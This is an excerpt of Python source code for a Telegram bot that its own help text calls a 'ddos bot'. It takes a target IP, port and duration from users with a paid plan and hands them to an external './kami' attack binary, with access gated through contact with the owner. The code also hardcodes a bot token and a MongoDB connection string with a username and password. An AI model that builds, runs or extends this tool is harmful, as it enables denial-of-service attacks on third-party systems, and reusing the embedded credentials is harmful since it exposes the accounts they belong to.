#THIS FILE IS A PUBLIC FILE MADE BY @VIPKAMISAMA
...
TOKEN = '7907724372:AAH2CnMzypECXA_wOeJoD74xdG52trcBqV8'
MONGO_URI = 'mongodb+srv://Kamisama:Kamisama@kamisama.m6kon.mongodb.net/'
FORWARD_CHANNEL_ID = -1002237958466
CHANNEL_ID = -1002237958466
...
async def run_attack_command_async(target_ip, target_port, duration):
    process = await asyncio.create_subprocess_shell(f"./kami {target_ip} {target_port} {duration} 20")
    ...
    try:
        ...
        if not user_data or user_data['plan'] == 0:
            bot.send_message(chat_id, "*🚫 Access Denied!*\n"  # Access Denied message
                                       ...
                                       "*Contact the owner for assistance: @VIPKAMISAMA*", parse_mode='Markdown')  # Contact owner message
            return
...
def process_attack_command(message):
    try:
        ...
        if target_port in blocked_ports:
            ...
            return
        if duration >= 901:
            bot.send_message(message.chat.id, "*⏳ Maximum duration is 900 seconds.*\n"  # Duration limit message
...
def myinfo_command(message):
    ...
    if not user_data:
        ...
        response += "*For assistance, please contact the owner: @VIPKAMISAMA* "  # Contact owner message
    elif user_data.get('plan', 0) == 0:
        # User found but not approved
        response = "*🔒 Your account is still pending approval!* \n"  # Not approved message
        response += "*Please reach out to the owner for assistance: @VIPKAMISAMA* 🙏"  # Contact owner message
    else:
...
def help_command(message):
    help_text = ("*🌟 Welcome to the ddos bot made by @VIPKAMISAMA*\n\n"
